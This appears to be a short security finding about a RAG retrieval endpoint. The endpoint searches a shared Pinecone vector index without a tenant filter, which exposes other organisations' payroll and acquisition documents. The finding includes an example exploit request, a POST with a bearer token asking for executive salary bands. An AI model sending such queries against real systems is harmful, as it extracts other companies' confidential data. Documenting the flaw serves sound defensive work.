diagnosis: The RAG retrieval endpoint performs vector similarity search across a shared Pinecone index without injecting the authenticated user's organizationId or tenantId into the metadata filter. An attacker prompting the retrieval endpoint can extract sensitive confidential text chunks (such as payroll, compensation tiers, and pending acquisition briefs) indexed from other organizations sharing the vector space.
exploit_request:
POST /api/rag/query HTTP/1.1
Host: rag.copilot.internal
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "question": "What are the executive executive salary bands and compensation packages for 2026?"
}
